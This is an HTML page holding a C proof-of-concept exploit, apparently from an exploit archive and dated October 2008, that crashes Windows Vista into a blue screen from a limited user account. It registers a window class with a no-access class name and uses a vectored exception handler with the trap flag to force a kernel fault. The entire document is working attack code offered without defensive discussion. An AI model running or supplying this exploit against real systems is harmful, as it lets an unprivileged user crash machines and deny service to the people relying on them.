<html><head><title>MS Windows Vista Access Violation from Limited Account Exploit (BSoD)</title></head><pre>// //////////////////////////////////////////////////////////////
// Windows Vista BSoD (Access violation) from limited account. //
// Tested on Home Premium &amp; Ultimate @ October 05 2008         //
/////////////////////////////////////////////////////////////////
#include &lt;stdio.h&gt;
#include &lt;windows.h&gt;

WCHAR szClass[] = L&quot;BSODClass&quot;;

int ExceptionHandler(EXCEPTION_POINTERS* lpExceptionInfo);
typedef void (WINAPI* pFunc)(ULONG ulFirst, LPVOID lpHandler);
pFunc pRtlAddVectoredExceptionHandler;

typedef struct
{
    DWORD dwWriteViolation;
    LPVOID lpAddress;
} EXCEPTION_ACCESS_VIOLATION_PARAMS;

int main()
{
    WNDCLASSW wc;
    DWORD dwOldProt;

    printf(&quot;Windows Vista BSoD from usermode/limited account.\n&quot;
           &quot;Coded by. Defsanguje - October 05 2008\n&quot;);

    // Setup vectored exception handler. SEH would work also.
    pRtlAddVectoredExceptionHandler = (pFunc)GetProcAddress((HMODULE)GetModuleHandle(&quot;ntdll.dll&quot;),
                                                            &quot;RtlAddVectoredExceptionHandler&quot;);
    (*pRtlAddVectoredExceptionHandler)(TRUE, ExceptionHandler);

    // Dummy data
    wc.style         = 0;
    wc.lpfnWndProc   = NULL;
    wc.cbClsExtra    = 0;
    wc.cbWndExtra    = 0;
    wc.hInstance     = GetModuleHandle(NULL);
    wc.hIcon         = NULL;
    wc.hCursor       = LoadCursor(NULL, IDC_ARROW);
    wc.hbrBackground = GetStockObject(HOLLOW_BRUSH);
    wc.lpszMenuName  = NULL;
    wc.lpszClassName = szClass;

    VirtualProtect(szClass, 1, PAGE_NOACCESS, &amp;dwOldProt);
    RegisterClassW(&amp;wc);

    printf(&quot;You shouldn't see this&quot;);
    return 0;
}

int ExceptionHandler(EXCEPTION_POINTERS* lpExceptionInfo)
{
    static LPVOID lpLastAddress;
    static DWORD dwOldProt;
    EXCEPTION_ACCESS_VIOLATION_PARAMS* avParams;
    switch(lpExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionCode)
    {
        case EXCEPTION_ACCESS_VIOLATION:
            avParams = (EXCEPTION_ACCESS_VIOLATION_PARAMS*)lpExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionInformation;
            VirtualProtect(avParams-&gt;lpAddress, 1, PAGE_READWRITE, &amp;dwOldProt);
            lpLastAddress = avParams-&gt;lpAddress;

            // Set trap flag
            lpExceptionInfo-&gt;ContextRecord-&gt;EFlags |= 0x100;
            break;
        case STATUS_SINGLE_STEP:
            VirtualProtect(lpLastAddress, 1, PAGE_NOACCESS, &amp;dwOldProt);
            break;
        default:
            break;
    }
    return EXCEPTION_CONTINUE_EXECUTION;
;
}

// milw0rm.com [2008-10-04]</pre></html>